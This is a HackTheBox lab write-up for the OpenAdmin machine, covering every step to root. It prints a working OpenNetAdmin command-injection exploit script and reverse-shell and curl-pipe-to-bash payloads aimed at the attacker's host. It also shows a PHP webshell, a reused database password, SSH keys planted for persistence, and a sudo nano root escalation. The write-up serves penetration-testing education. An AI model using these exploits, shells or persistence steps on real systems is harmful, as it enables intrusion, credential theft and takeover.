---
render_with_liquid: false
title: HackTheBox Writeup  OpenAdmin
date: 2024-01-11 13:43:07 +1400
tags: [hackthebox, nmap, linux, feroxbuster, open-net-admin, php, command-injection, linpeas, discover-secrets, password-reuse, port-forwarding, webshell, sudo, gtfobin]
---



OpenAdmin is an easy difficulty Linux machine that features an outdated OpenNetAdmin CMS instance. The CMS is exploited to gain a foothold, and subsequent enumeration reveals database credentials. These credentials are reused to move laterally to a low privileged user. This user is found to have access to a restricted internal application. Examination of this application reveals credentials that are used to move laterally to a second user. A sudo misconfiguration is then exploited to gain a root shell.


# Recon
---

```bash
┌──(bravosec㉿fsociety)-[~/htb/OpenAdmin]
└─$ pt init '10.129.61.100 OpenAdmin openadmin.htb'
+-----------+--------+---------------+---------------+
|  PROFILE  | STATUS |      IP       |    DOMAIN     |
+-----------+--------+---------------+---------------+
| openadmin | on     | 10.129.61.100 | OpenAdmin     |
| openadmin | on     | 10.129.61.100 | openadmin.htb |
+-----------+--------+---------------+---------------+
```

## Nmap

```bash

# Nmap 7.94SVN scan initiated Thu Jan 11 13:43:07 2024 as: nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80 OpenAdmin
Nmap scan report for OpenAdmin (10.129.61.100)
Host is up, received user-set (0.22s latency).
Scanned at 2024-01-11 13:43:07 CST for 14s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCcVHOWV8MC41kgTdwiBIBmUrM8vGHUM2Q7+a0LCl9jfH3bIpmuWnzwev97wpc8pRHPuKfKm0c3iHGII+cKSsVgzVtJfQdQ0j/GyDcBQ9s1VGHiYIjbpX30eM2P2N5g2hy9ZWsF36WMoo5Fr+mPNycf6Mf0QOODMVqbmE3VVZE1VlX3pNW4ZkMIpDSUR89JhH+PHz/miZ1OhBdSoNWYJIuWyn8DWLCGBQ7THxxYOfN1bwhfYRCRTv46tiayuF2NNKWaDqDq/DXZxSYjwpSVelFV+vybL6nU0f28PzpQsmvPab4PtMUb0epaj4ZFcB1VVITVCdBsiu4SpZDdElxkuQJz
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHqbD5jGewKxd8heN452cfS5LS/VdUroTScThdV8IiZdTxgSaXN1Qga4audhlYIGSyDdTEL8x2tPAFPpvipRrLE=
|   256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBcV0sVI0yWfjKsl7++B9FGfOVeWAIWZ4YGEMROPxxk4
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Thu Jan 11 13:43:21 2024 -- 1 IP address (1 host up) scanned in 14.15 seconds
```

## 80 - HTTP : Apache2 Default Page


### Info

![](/assets/obsidian/a6c86ebe68e5ec02afe24bd245ade487.png)

### Directory

```bash
feroxbuster -t 100 -k -u 'http://openadmin/' -o ferox_80_big.txt -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/OpenAdmin]
└─$ cat ferox_80_big.txt | grep -viE '.js$|.css$|.jpg$|.png$|.ttf$'
200      GET      375l      964w    10918c http://openadmin/
301      GET        9l       28w      308c http://openadmin/artwork => http://openadmin/artwork/
MSG      0.000 feroxbuster::heuristics detected directory listing: http://openadmin/artwork/css (Apache)
301      GET        9l       28w      312c http://openadmin/artwork/css => http://openadmin/artwork/css/
MSG      0.000 feroxbuster::heuristics detected directory listing: http://openadmin/artwork/css/bootstrap (Apache)
200      GET        1l        1w    87498c http://openadmin/artwork/css/bootstrap.min.css.map
MSG      0.000 feroxbuster::heuristics detected directory listing: http://openadmin/artwork/fonts (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://openadmin/artwork/fonts/icomoon (Apache)
301      GET        9l       28w      314c http://openadmin/artwork/fonts => http://openadmin/artwork/fonts/
MSG      0.000 feroxbuster::heuristics detected directory listing: http://openadmin/artwork/fonts/flaticon (Apache)
200      GET        0l        0w  1263120c http://openadmin/artwork/fonts/icomoon/demo.html
301      GET        9l       28w      315c http://openadmin/artwork/images => http://openadmin/artwork/images/
MSG      0.000 feroxbuster::heuristics detected directory listing: http://openadmin/artwork/images (Apache)
200      GET        1l        1w      920c http://openadmin/artwork/fonts/flaticon/backup.txt
MSG      0.000 feroxbuster::heuristics detected directory listing: http://openadmin/artwork/js (Apache)
301      GET        9l       28w      311c http://openadmin/artwork/js => http://openadmin/artwork/js/
301      GET        9l       28w      306c http://openadmin/music => http://openadmin/music/
301      GET        9l       28w      307c http://openadmin/sierra => http://openadmin/sierra/
MSG      0.000 feroxbuster::heuristics detected directory listing: http://openadmin/music/css (Apache)
301      GET        9l       28w      310c http://openadmin/music/css => http://openadmin/music/css/
MSG      0.000 feroxbuster::heuristics detected directory listing: http://openadmin/music/img (Apache)
301      GET        9l       28w      310c http://openadmin/music/img => http://openadmin/music/img/
MSG      0.000 feroxbuster::heuristics detected directory listing: http://openadmin/music/img/songs (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://openadmin/music/img/playlist (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://openadmin/music/img/blog (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://openadmin/music/img/premium (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://openadmin/music/img/icons (Apache)
200      GET        5l       43w    46134c http://openadmin/music/img/favicon.ico
MSG      0.000 feroxbuster::heuristics detected directory listing: http://openadmin/music/img/concept (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://openadmin/music/js (Apache)
301      GET        9l       28w      309c http://openadmin/music/js => http://openadmin/music/js/
MSG      0.000 feroxbuster::heuristics detected directory listing: http://openadmin/sierra/css (Apache)
301      GET        9l       28w      311c http://openadmin/sierra/css => http://openadmin/sierra/css/
200      GET        1l        1w    21280c http://openadmin/sierra/css/style.css.map
MSG      0.000 feroxbuster::heuristics detected directory listing: http://openadmin/sierra/fonts (Apache)
301      GET        9l       28w      313c http://openadmin/sierra/fonts => http://openadmin/sierra/fonts/
MSG      0.000 feroxbuster::heuristics detected directory listing: http://openadmin/sierra/js (Apache)
301      GET        9l       28w      310c http://openadmin/sierra/js => http://openadmin/sierra/js/
MSG      0.000 feroxbuster::heuristics detected directory listing: http://openadmin/sierra/vendors (Apache)
301      GET        9l       28w      315c http://openadmin/sierra/vendors => http://openadmin/sierra/vendors/
MSG      0.000 feroxbuster::heuristics detected directory listing: http://openadmin/sierra/vendors/circle-bar (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://openadmin/sierra/vendors/progress (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://openadmin/sierra/vendors/isotope (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://openadmin/sierra/vendors/counterup (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://openadmin/sierra/vendors/magnify-popup (Apache)
MSG      0.000 feroxbuster::heuristics detected directory listing: http://openadmin/sierra/vendors/owl-carousel (Apache)
301      GET        9l       28w      326c http://openadmin/sierra/vendors/revolution => http://openadmin/sierra/vendors/revolution/
301      GET        9l       28w      333c http://openadmin/sierra/vendors/revolution/assets => http://openadmin/sierra/vendors/revolution/assets/
301      GET        9l       28w      330c http://openadmin/sierra/vendors/revolution/css => http://openadmin/sierra/vendors/revolution/css/
301      GET        9l       28w      332c http://openadmin/sierra/vendors/revolution/fonts => http://openadmin/sierra/vendors/revolution/fonts/
200      GET        0l        0w        0c http://openadmin/sierra/vendors/revolution/index.php
301      GET        9l       28w      329c http://openadmin/sierra/vendors/revolution/js => http://openadmin/sierra/vendors/revolution/js/
301      GET        9l       28w      330c http://openadmin/sierra/vendors/revolution/php => http://openadmin/sierra/vendors/revolution/php/
```

# User Flag
---

## Enumeration

There's only 3 sub webapps discovered on port 80 : `/sierra`, `/artwork`, `/music/`

Only `/music/` provides dynamic functions

![](/assets/obsidian/fbc29d358ed5d4f4044a21e3567382ba.png)

By clicking at `Login`, it redirected to `http://openadmin/ona/`

Version revealed : `Open Net Admin v18.1.1`

![](/assets/obsidian/97c937af0bb02e966fd7342efd62fdeb.png)

## Shell as www-data


### OpenNetAdmin 18.1.1 RCE 

Google : `Open Net Admin v18.1.1 exploit`

> https://www.exploit-db.com/exploits/47691

There's command injection at web root in post parameter `xajaxargs`

POC :

```bash

#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```

Command execution was successful

```bash
┌──(bravosec㉿fsociety)-[~/htb/OpenAdmin/exploit]
└─$ searchsploit -m 47691
  Exploit: OpenNetAdmin 18.1.1 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47691
     Path: /usr/share/exploitdb/exploits/php/webapps/47691.sh
    Codes: N/A
 Verified: False
File Type: ASCII text
Copied to: /home/kali/htb/OpenAdmin/exploit/47691.sh


┌──(bravosec㉿fsociety)-[~/htb/OpenAdmin/exploit]
└─$ ./47691.sh http://openadmin/ona/
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Host reverse shell

```bash
┌──(bravosec㉿fsociety)-[~/htb/OpenAdmin]
└─$ mkdir www && cd www

┌──(bravosec㉿fsociety)-[~/htb/OpenAdmin/www]
└─$ echo '/bin/bash -c "bash -i >& /dev/tcp/10.10.14.22/1111 0>&1"' > index.html

┌──(bravosec㉿fsociety)-[~/htb/OpenAdmin/www]
└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/OpenAdmin/exploit]
└─$ ./47691.sh http://openadmin/ona/
$ curl 10.10.14.22|bash
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/OpenAdmin/exploit]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.22] from (UNKNOWN) [10.129.123.171] 50362
bash: cannot set terminal process group (1247): Inappropriate ioctl for device
bash: no job control in this shell
www-data@openadmin:/opt/ona/www$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<ww$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@openadmin:/opt/ona/www$ ^Z
zsh: suspended  nc -lvnp 1111

stty raw -echo;fg
export TERM=xterm
┌──(bravosec㉿fsociety)-[~/htb/OpenAdmin/exploit]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111
                               export TERM=xterm
www-data@openadmin:/opt/ona/www$ stty rows 50 columns 209
www-data@openadmin:/opt/ona/www$
```

## From www-data to jimmy


### Enumeration

Run **linpeas** in background while manually enumerating

```bash
┌──(bravosec㉿fsociety)-[~/htb/OpenAdmin]
└─$ echo 'curl 10.10.14.22/linpeas.sh|bash' | nc -lvnp 1111 | tee linpeas.txt
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/OpenAdmin/exploit]
└─$ ./47691.sh http://openadmin/ona/
$ curl 10.10.14.22 | bash
```

3 users on machine

```bash
www-data@openadmin:/opt/ona/www$ cat /etc/passwd|grep sh$
root:x:0:0:root:/root:/bin/bash
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
```

First thing to do is check web apps and harvest secrets

Google : `open net admin config location`

```bash
www-data@openadmin:/opt/ona/www$ cat local/config/database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' =>
  array (
    'databases' =>
    array (
      0 =>
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```

Check database

```bash
www-data@openadmin:/opt/ona/www$ mysql -u ona_sys -p'n1nj4W4rri0R!'
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 14
Server version: 5.7.28-0ubuntu0.18.04.4 (Ubuntu)

Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| ona_default        |
+--------------------+
2 rows in set (0.00 sec)

mysql> use ona_default;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+------------------------+
| Tables_in_ona_default  |
+------------------------+
[...]
| tags                   |
| users                  |
| vlan_campuses          |
| vlans                  |
+------------------------+
40 rows in set (0.00 sec)

mysql> select * from suers;
ERROR 1146 (42S02): Table 'ona_default.suers' doesn't exist
mysql> select * from users;
+----+----------+----------------------------------+-------+---------------------+---------------------+
| id | username | password                         | level | ctime               | atime               |
+----+----------+----------------------------------+-------+---------------------+---------------------+
|  1 | guest    | 098f6bcd4621d373cade4e832627b4f6 |     0 | 2024-01-12 05:14:56 | 2024-01-12 05:14:56 |
|  2 | admin    | 21232f297a57a5a743894a0e4a801fc3 |     0 | 2007-10-30 03:00:17 | 2007-12-02 22:10:26 |
+----+----------+----------------------------------+-------+---------------------+---------------------+
2 rows in set (0.00 sec)

mysql>
```

The md5 hashes are default passwords, tried password reuse but no result

> https://crackstation.net/

![](/assets/obsidian/a5d6ee5b81ab02baba542c267f30ad4a.png)

There's a port `52846` opened only on local

```bash
www-data@openadmin:/opt/ona/www$ ss -ltnp|grep 127
LISTEN   0         80                127.0.0.1:3306             0.0.0.0:*
LISTEN   0         128               127.0.0.1:52846            0.0.0.0:*
LISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:*
```

It's another web app hosted by **Apache**

```bash
www-data@openadmin:/opt/ona/www$ nc 127.0.0.1 52846 -v
Connection to 127.0.0.1 52846 port [tcp/*] succeeded!
x
HTTP/1.1 400 Bad Request
Date: Fri, 12 Jan 2024 05:22:53 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 314
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at internal.openadmin.htb Port 80</address>
</body></html>
```

Get **apache** site configs

Port `52846` - the internal web app runs as `joanna`

```bash
www-data@openadmin:/opt/ona/www$ cat /etc/apache2/sites-enabled/internal.conf
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```

Port `80` - **Open Net Admin** was setup by `jimmy`

```bash
www-data@openadmin:/opt/ona/www$ cat /etc/apache2/sites-enabled/openadmin.conf
<VirtualHost *:80>
        # The ServerName directive sets the request scheme, hostname and port that
        # the server uses to identify itself. This is used when creating
        # redirection URLs. In the context of virtual hosts, the ServerName
        # specifies what hostname must appear in the request's Host: header to
        # match this virtual host. For the default virtual host (this file) this
        # value is not decisive as it is used as a last resort host regardless.
        # However, you must set it for any further virtual host explicitly.
        ServerName openadmin.htb

        ServerAdmin jimmy@openadmin.htb
        DocumentRoot /var/www/html

        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
        # error, crit, alert, emerg.
        # It is also possible to configure the loglevel for particular
        # modules, e.g.
        #LogLevel info ssl:warn

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

        # For most configuration files from conf-available/, which are
        # enabled or disabled at a global level, it is possible to
        # include a line for only one particular virtual host. For example the
        # following line enables the CGI configuration for this host only
        # after it has been globally disabled with "a2disconf".
        #Include conf-available/serve-cgi-bin.conf
</VirtualHost>


# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```

At the mean time, **linpeas** finished the scan and shows that `joanna` can run **nano** as root, it's an easy **privesc** that was indexed on **gtfobin**

![](/assets/obsidian/a3f0c4502ea95c4584b75a3dc9d47f59.png)

### Mysql database password reuse

Since jimmy is the one who setup **open net admin**, try the database password on his account

```bash
www-data@openadmin:/opt/ona/www$ su - jimmy
Password:n1nj4W4rri0R!
jimmy@openadmin:~$ id
uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)
```


## From jimmy to joanna


### PHP webshell

Jimmy have a none default group : `internal`, check the group members and what they own

```bash
jimmy@openadmin:~$ cat /etc/group|grep internal
internal:x:1002:jimmy,joanna
```

```bash
jimmy@openadmin:~$ find / -type f -not -path "/proc/*" -not -path "/run/*" -not -path "/sys/*" -not -path "/var/lib/*" -group internal -ls 2>/dev/null
   282830      4 -rwxrwxr-x   1 jimmy    internal      339 Nov 23  2019 /var/www/internal/main.php
     2644      4 -rwxrwxr-x   1 jimmy    internal      185 Nov 23  2019 /var/www/internal/logout.php
     1387      4 -rwxrwxr-x   1 jimmy    internal     3229 Nov 22  2019 /var/www/internal/index.php
```

I can write webshell to `/var/www/internal` in order to get `joanna`'s session

```bash
jimmy@openadmin:~$ echo '<?php system($_REQUEST[0]); ?>' > /var/www/internal/cache.php
```

To port forward `52846`, we can use SSH

Generate a pair of ssh keys first

```bash
┌──(bravosec㉿fsociety)-[~/htb/OpenAdmin]
└─$ ssh-keygen -f openadmin
Generating public/private ed25519 key pair.
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in openadmin
Your public key has been saved in openadmin.pub
The key fingerprint is:
SHA256:FmaqKnX/Xq2zq8llxzhpLfhFILpcNCtENWYRCFWiU3s bravosec@fsociety
The key's randomart image is:
+--[ED25519 256]--+
|    .o=+Oo       |
|     +.= .       |
|    o o E .      |
|     o B = .     |
|      + S   .    |
|  . .o = . B     |
| . ...o . X *    |
|.  .  .. B.*     |
| ..    o*.=+     |
+----[SHA256]-----+

┌──(bravosec㉿fsociety)-[~/htb/OpenAdmin]
└─$ cat openadmin.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKCqjroMePsux0ls7W8LwgmYXToboJ/mZbl6nSXC9gNE bravosec@fsociety
```

Write ssh keys

```bash
jimmy@openadmin:~$ mkdir -p ~/.ssh && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKCqjroMePsux0ls7W8LwgmYXToboJ/mZbl6nSXC9gNE bravosec@fsociety' >> ~/.ssh/authorized_keys
```

Local port forward with ssh

```bash
┌──(bravosec㉿fsociety)-[~/htb/OpenAdmin]
└─$ ssh -i openadmin jimmy@openadmin.htb -L 52846:127.0.0.1:52846
```

Get reverse shell

```bash
┌──(bravosec㉿fsociety)-[~/htb/OpenAdmin]
└─$ curl 127.0.0.1:52846/cache.php --data-urlencode '0=curl 10.10.14.22 | bash'
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/OpenAdmin]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.14.22] from (UNKNOWN) [10.129.123.171] 51258
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
joanna@openadmin:/var/www/internal$ ^Z
zsh: suspended  nc -lvnp 1111

stty raw -echo;fg
export TERM=xterm
stty rows 50 columns 209
┌──(bravosec㉿fsociety)-[~/htb/OpenAdmin]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111
                               export TERM=xterm
joanna@openadmin:/var/www/internal$ stty rows 50 columns 209
joanna@openadmin:/var/www/internal$ id
uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
joanna@openadmin:/var/www/internal$ cat ~/user.txt
6ba898ab34da8a6d3ce38f2b00f24607
```

# Root Flag
---

## From joanna to root


### SUDO

**sudo** won't work without a proper shell due to the `setuid` issue of **Apache**

```bash
joanna@openadmin:/var/www/internal$ sudo -l
sudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permitted
sudo: error initializing audit plugin sudoers_audit
```

Write ssh keys to get a proper shell

```bash
joanna@openadmin:/var/www/internal$ mkdir -p ~/.ssh && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKCqjroMePsux0ls7W8LwgmYXToboJ/mZbl6nSXC9gNE bravosec@fsociety' >> ~/.ssh/authorized_keys
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/OpenAdmin]
└─$ ssh -i openadmin joanna@openadmin.htb
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Jan 12 06:02:08 UTC 2024

  System load:  0.0               Processes:             189
  Usage of /:   30.9% of 7.81GB   Users logged in:       1
  Memory usage: 15%               IP address for ens160: 10.129.123.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

39 packages can be updated.
11 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Jul 27 06:12:07 2021 from 10.10.14.15
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

Follow https://gtfobins.github.io/gtfobins/nano/#sudo

```bash
sudo /bin/nano /opt/priv
```

Press `CTRL + R` then `CTRL + X` to execute command

```bash
reset; sh 1>&0 2>&0
```

![](/assets/obsidian/619b5af0cc36bfa5e10fe645c4ffec62.png)

![](/assets/obsidian/a550914b8ead1f671e2fb20a80f82b5c.png)

```bash

# cat /root/root.txt
8303ec94f0725445273aaf91abd5cd6d
```

# Additional
---
